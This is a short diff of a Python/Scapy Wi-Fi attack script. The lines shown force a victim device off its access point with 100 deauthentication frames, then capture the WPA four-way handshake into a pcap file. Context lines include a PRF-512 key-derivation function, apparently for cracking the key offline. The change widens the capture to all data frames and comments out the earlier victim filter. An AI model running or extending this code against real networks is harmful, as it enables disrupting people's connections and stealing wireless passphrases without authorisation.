@@ -42,20 +42,22 @@ def AP_sniff(pkt):
 			return True
 
 def handshake_sniff(pkt):
-	if (len(handshakes) == 4):
-		return True
-	if pkt.type == 2 and pkt.subtype == 8:
-		if (pkt.addr1 == victimMAC and pkt.addr2 == APmac):
-			if(not handshakes or (pkt not in handshakes)):
-				print "adding handshake"
-				pkt.show()
-				handshakes.append(pkt)
-	if pkt.type == 2 and pkt.subtype == 0:
-		if (pkt.addr1 == APmac and pkt.addr2 == victimMAC):
-			if(not handshakes or (pkt not in handshakes)):
-				print "adding handshake"
-				pkt.show()
-				handshakes.append(pkt)
+	if (pkt.type == 2 and (pkt.subtype == 0 or pkt.subtype == 8)):
+		wrpcap("4way.pcap",pkt,append=True)
+
+	# if (len(handshakes) == 100):
+	# 	return True
+	# elif pkt.type == 2 and pkt.subtype == 8:
+	# 	if (pkt.addr1 == victimMAC and pkt.addr2 == APmac):
+	# 			print "adding handshake type 8"
+	# 			wrpcap("4way.pcap",pkt,append=True)
+	# 			handshakes.append(pkt)
+	# elif pkt.type == 2 and pkt.subtype == 0:
+	# 	if (pkt.addr1 == APmac and pkt.addr2 == victimMAC):
+	# 		if(not handshakes or (pkt not in handshakes)):
+	# 			print "adding handshake type 0"
+	# 			wrpcap("4way.pcap",pkt,append=True)
+	# 			handshakes.append(pkt)
 
 def customPRF512(key,A,B):
     """
@@ -126,7 +128,7 @@ APmac = pktAP[len(pktAP)-1].addr2
 deauth(100, APmac, victimMAC)
 
 print "Starting sniff for handshakes..."
-
+count8 = 0
 handshakes = []
 pktHS = sniff(iface=interface,stop_filter=handshake_sniff)
 
